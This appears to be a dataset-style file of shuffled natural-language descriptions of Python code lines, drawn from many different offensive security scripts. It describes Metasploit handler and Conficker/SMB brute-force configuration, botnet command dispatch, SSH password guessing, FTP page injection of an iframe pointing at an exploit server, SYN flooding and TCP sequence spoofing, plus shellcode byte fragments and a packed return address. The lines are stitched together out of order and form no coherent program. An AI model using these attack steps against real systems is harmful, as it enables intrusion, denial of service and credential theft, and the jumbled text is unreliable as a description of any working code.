+For each tag and value in the method items with no arguments of info
+Import the library for parsing data
+Import the library to create a network socket
+For each i in the result of the function range with argument 100
+Call the function returnDir with no arguments and assign the result to recycledDir
+Call the method write of configFile with argument 'set LPORT ' concatenated to the function str with argument lport concatenated to '\n'
+Assign to conn_closed the value 'Connection closed by remote host'
+Define the function google with argument search_term
+Assign to ab the class anonBrowser with no argument
+Import the library to manage socket
+Assign to count the count of options
+Call the function QueryValueEx with arguments key and 'ProfileImagePath' and assign it to the tuple value and type
+Call function exit with argument 0
+Create a packet pkt with source src, destination dst, UDP with destination port equals to 518 and the load equals to "\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8"
+Exit function
+Start finally block
+Call the function testForExif with argument imgFileName
+Create a parser with OptionParser 'usage %prog -i <interface> -t <thresh>'
+Assign 0 to diffSeq
+For each pkt in pkts
+Call the function botnetCommand with argument 'uname -v'
+Define the variable host and assign the value '192.168.95.179'
+Calculate the state as the as the tgthost with protocol tcp on the port tgtPort with state field
+Call the function retKML with argument dst and assign it to dstKML 
+and "\x40\x5c\x64\x0e\xa5\x53\x97\xce\xa1\xe4\xe4\xfc\x6e\x5f" 
+and "\x88\x6e\x5c\x3b\xb0\xe4\x9c\xc4\x65\xaa\xcc\x6a\xd5\x0b" 
+Connect to the database downloadDB and assign it to conn
+Exit the function with the tuple None and None
+Assign to the variable maxConnections the value 5
+Call function main with no arguments
+Continue and concatenate with argument  "-F <PDF file name>'
+Do nothing
+Create a parser with OptionParser 'usage %prog -p <pcap file>'
+Assign to the tuple options and args the result of the function parse_args with no argument of parser
+Exit the function
+Concatenate the strings city, ',' and country to geoLoc
+Assign to count the value 1
+If the method of http is equal to 'GET'
+and "\xce\x10\xc3\x86\xd1\xf5\x7f\xb2\x5a\xf8\xaf\x32\x18\xdf" 
+Assign to rcode the value rcode of the method getlayer with argument DNS of pkt
+Define function send_command with arguments self and cmd
+Call the open function with arguments page concatenated to '.tmp' and 'w'
+and "\xac\x31\x64\x1f\x38\xac\xdf\x89\x5e\x2d\xb9\xf2\xda\xea" 
+Wait 1 second
+Assign to synPkt the IPlayer divided by the TCPlayer
+Import the library to manages json files
+Call the function findall with arguments r'maplat=.*\&' and resp from re and assign it to rLon
+For each stream in pktCount
+Call the method append on botNet with argument client
+Call the function spoofConn with arguments srcSpoof, tgt and seqNum
+Import the library to manage urls
+Add the option of the parser p for passDir as a string with help specify directory wtih keys
+Return the variable kml
+Import the library to parse text
+Define smbBrute with arguments configFile, tgtHost, passwdFile, lhost and lport
+Call the function handlePkt with argument pkt
+Call the function send_command with argument command and assign the value to output
+Call the exit function with argument 0
+Define the function findTgts with argument subNet
+Assign to search_term the result of the function quote_pulse with argument search_term of urllib
+From the library to parse urls import urlsplit
+If placesDB is a file 
+Return the object child
+Call the method parse_args with no arguments of parser and assign the result to the tuple made of options and args
+Call the method getDocumentInfo with no argument and assign it to docInfo
+Assign to results the result of the function google with argument keyword
+Use the command "SELECT fullname, skypename, city, country,  datetime(profile_timestamp,'unixepoch') FROM Accounts;" on c
+Call the method write of configFile with argument 'use exploit/multi/handler\n'
+For each fileName in dirList
+Define the method __init__ with arguments self, title, text and url
+Call the function testUserAgent with argument url and userAgent
+Append to the list dnsRecords at the key rrname the value rdata
+Call the exit function with argument 0
+Divide IPlayer by TCPlayer and assign it to pkt
+Define the function testProxy with argument url and proxy
+Define the function returnDir with no arguments
+Assign to city the field 'city' 
+Define the function injectPage with arguments ftp, page and redirect
+Create the tuple kml with arguments '<Placemark>\n', '<name>%s</name>\n',  '<Point>\n', '<coordinates>%6f, %6f</coordinates>\n',  '</Point>\n' and '</Placemark>\n')
+Define the function explitTest with arguments src, dst, iface and count
+Import the library to parse string
+Call the method write of configFile with argument 'set LPORT ' concatenated to the function str with argument lport  concatenated to '\n'
+Define confickerExploit with arguments configFile, tgtHost, lhost and lport
+Call the function checkTTL with arguments ipsrc and ttl
+For each ts and buf in pcap
+Call the method write of configFile with argument 'set SMBPass' concatenated to the function str with argument password concatenated to '\n'
+Start expect block with Exception and e
+Start the expect block
+Assign to ret the object pack with arguments '<L' and 0x7C874413 of struct
+Call the function mirrorImages with arguments url and dir
+Assign to the variable user the value 'root'
+Assign to parser the OptionParser with argument the concatenation of 'usage %prog ' and '-u <target url>' of optparse
+Define the function printCookies with argument url
+Continue the concatenation with '"http:\\\\10.10.10.112:8080\\exploit"></iframe>'
+For each fileName in dirList
+Assign to addr the result of the function str with argument row at the position 1
+Assign an empty list to retList
+Add the option to the parser '-p', dest equals to 'pathName', type equals to 'string' and help equals to 'specify skype profile path'
+Call the function synFlood with arguments synSpoof and srcSpoof
+Send the packet to iface and count equals count
+define the constructor with arguments self, host and password
+Call function setdefaulttimeout with parameter 1
+Do nothing
+Assign to pcap the result of the Reader function with argument f of pcap of dpkt
+Assign to imgSrc the value imgTag sliced at 'src'
+If rcode is equal to 3
+Assign to cookiesDB the path of  'cookies.sqlite' joined with pathName
+Exit function with argument 'Unregistered'
+and "\xf6\xcb\x27\x12\xeb\x6c\xac\x84\xcf\x8d\x61\x52\x9b\x82" 
+Change the scope of the variable Stop to global
+Call the method login with arguments host, user and password of s
+Call the function Thread with arguments connScan assigned to target and args equals to the tuple tgtHost and the function int with argument tgtPort and assign the result to t
+Assign the value '<iframe src=' concatenated with the next line to redirect
+Call the method close with no arguments of imgFile
+Do nothing
+Assign to response the result of the method open with argument the concatenation of 'http://ajax.googleapis.com/', 'ajax/services/search/web?v=1.0&q=' and search_term of ab
+Call the function system with argument 'msfconsole -r meta.rc' from the library os
+Call the method prompt on self.session  with no arguments
+Exit function with argument 0
+Assign to unAnsReqs the value 0
+Define the function retGeoStr with argument ip
+Call the function exploitTest with arguments src, dst, iface and count
+Call the method write of configFile with argument 'set SMBUser' concatenated to the function str with argument username concatenated to '\n'
+Assign the object FTP from ftplib with argument host and assign it to ftp
+Exit function with argument None
+Add the option -H for tgtHost with type string and help as specify target host
+From the library to manipulate images import Image
+Assign to the tuple options and args the result of the method parse_args with no argument of parser
+If Fails is more than five
+Call the method open with arguments respURL and reqParams of browser then call the method read with no argument and assign it to resp
+Assign the result of the method connect with no argument to self.session
+and "\x11\xd0\x48\xf3\xcb\x8a\x27\x5d\x9b\x4b\x04\x5e\xdd\x53" 
+Call the function setupHandler with argument configFile, lhost and lport
+Define the function viewPage with argument url
+Exit function returning retList
+Assign to url the string 'http://whatismyuseragent.dotdoh.com/'
+Call the method write with argument data of save
+Call the class Thread with argument target equals to connect and assign it to t
+Start expect block 
+Exit the function with sid value
+Assign to parser the OptionParser with argument the concatenation of 'usage %prog ' and '-u <target url> -d <destination directory>' of optparse
+Import the library to parse data
+Call the method parse_args with no arguments and assign it to the tuple options and args
+Execute the command 'SELECT name, source, datetime(endTime/1000000,\'unixepoch\') FROM moz_downloads;' on c
+Start block finally
+Assign to keyword the variable keyword of options
+Call the function open with arguments passwdFile and 'r' and assign it to fn
+Define the function printRecord with argument tgt
+Assign to msgDirection the concatenation of To, the function str with argument row at position 1 and :
+Call the function val2addr with argument addr and assign it to macAddr
+Assign to the variable connStr the concatenation of 'ssh ', user, '@' and host
+Exit function returning value s
+Assign to url the result of function str with argument row at position 0
+If the substring google is the url in lower case
+If city is not equal to an empty string
+Assign to object the result of the method load with argument response of json
+if the function str with argument row at position 1 is not equal to function str with argument row at position 2
+Parse the information 'usage %prog "and "target url'
+Assign to tgt the IP '173.255.226.98'
+Assign an empty list to tgtHosts 
+Assign to iface of conf the string 'eth0'
+Call the method write of configFile with argument 'set RHOST' concatenated to the function str with argument password concatenated to '\n'
+Call the method expect with argument a list composed of the variable TIMEOUT from the library pexpect, ssh_newkey and the string [P|p]assword: of child and assign the result to ret
+If there are no url
+Assign to the variable username the value 'Administrator'
+Assign to response the result of the function open with argument the concatenation of 'http://ajax.googleapis.com/', 'ajax/services/search/web?v=1.0&q=' and search_term of ab
+Create a packet pkt with source src, destination dst, UDP with destination port equals to 10080 and the load equals to 'Amanda'
+Create a packet pkt with source src, destination dst, ICMP type 8 and id equals to 678 and the load equals to '1234'
+Request the data with a tcp connection and assign it to http
+Call the function GeoIP with argument '/opt/GeoIP/Geo.dat' and assign it to gi
+Use the command "SELECT displayname, skypename, city, country,phone_mobile, birthday FROM Contacts;" on c
+Define the function send_command with arguments s and cmd
+Call the method add_option with arguments '-u' dest equals to 'username' and type equals to 'string',
+Call the method write with argument redirect of f
+Return the sum of seqNum with diffSeq
+Assign to target the value argv at position 1 of sys 
+Call the method write of configFile with argument 'set LHOST ' concatenated to lhost concatenated to '\n'
+For each row in c
+If rdata is not in the lust dnsRecords with key rrname
+Parse the usage usage %prog, the target host, the user and the password list
+Call the function OpenKey with arguments HKEY_LOCAL_MACHINE and net and assign it to key
+Add the options to parser '-p', dest equalsto 'pcapFile', type equals to 'string',  help equals to 'specify pcap filename'
+From the library to get random values import randint
+Assign to passwdFile the value 'userpass.txt'
+Start except block with Exception and e
+Assign to rrname the rrname of the method getlayer with argument DNSRR of ptk
+Call the method write of configFile with argument 'set LHOST ' concatenated to  lhost concatenated to '\n'
+Assign to dst the ip destination of ip.dst
+Create a packet pkt with source src, destination dst, ICMP type 0 and the load equals to 'AAAAAAAAAA'
+Assign to params the dictionary empty
+For each tuple made of ts and buf of pcap
+If the method haslayer with argument DNSRR of pkt returns True and sport of the method getlayer with argument UPT of pkt is equals to 53
+Assign the value 'guest' to passWord 
+Call the function findAttack of pcap
+Call the function findDownload of pcap
+Define the function ddosTest with arguments src, dst, iface and count
+Call the function basename with argument urlsplit with argument imgSrc sliced at position 2 and assing it to imgFileName
+Start except block with Exception e
+Import the library to connect to database
+Connect to the database msgDB and assign it to conn
+Assign to browser the default browser of Browser
+If r exists
+If ret equals 2
+Assign the variable passwdFile of options to passwdFile
+If url is equal to None or if dir is equal to None
+Define the function sid2user with argument sid
+Call the function login with arguments 'anonymous' and 'me@your.com' from library ftp
+Assign to cookie_jar the LWPCookieJar with no argument of cookielib
+Load the json of response and assign it to object
+Start except block with Exception e
+Define the function downloadImage with argument imgTag
+Call the function printMeta with argument fileName
+For each line in the method readlines with no argument of fn
+Define the function printDownloads with argument downloadDB
+Call method prompt with no argument on s
+Assign to iface the string 'eth0'
+Import the library to perform a SSH connection
+Assign to srcSpoof the srcSpoof of options
+If the method has_tcp called with argument 445 of nmScan sliced at host is equal to True
+Assign to new_gr the result of the function Google_result with arguments title, text, url
